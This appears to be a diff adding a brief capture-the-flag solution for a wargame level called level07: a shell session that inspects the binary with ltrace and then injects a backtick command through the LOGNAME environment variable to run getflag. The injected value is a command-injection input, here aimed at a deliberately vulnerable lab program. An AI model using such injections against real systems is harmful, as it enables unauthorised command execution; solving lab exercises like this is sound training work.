@@ -1,0 +1,5 @@
+> ls -al
+> ./level07
+> ltrace ./level07
+> env LOGNAME='`getflag`' ./level07
+> su level08
